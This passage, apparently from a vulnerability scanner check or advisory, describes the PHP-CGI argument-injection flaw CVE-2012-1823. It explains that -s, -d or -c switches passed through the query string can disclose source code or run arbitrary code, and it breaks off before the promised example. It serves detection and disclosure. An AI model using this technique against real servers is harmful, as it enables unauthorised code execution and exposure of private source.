  Other products / applications might be affected by the tested CVE-2012-1823 as well.","When PHP is used in a CGI-based setup (such as Apache's
  mod_cgid), the php-cgi receives a processed query string parameter as command line arguments which
  allows command-line switches, such as -s, -d or -c to be passed to the php-cgi binary, which can
  be exploited to disclose source code and obtain arbitrary code execution.

  An example of the -s command, allowing an attacker to view the source code of index.php is below:
